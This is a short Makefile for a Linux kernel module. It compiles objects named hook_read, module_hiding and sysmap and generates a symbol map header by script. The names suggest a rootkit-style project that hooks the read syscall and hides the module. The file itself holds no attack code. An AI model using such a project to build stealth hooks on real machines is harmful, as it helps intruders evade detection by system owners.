obj-m += mod.o
mod-objs := hook_read.o module_hiding.o sysmap.o global.o



all: sysmap.h
		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules


sysmap.h:
		sh ./create_sysmap.sh

clean:
		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
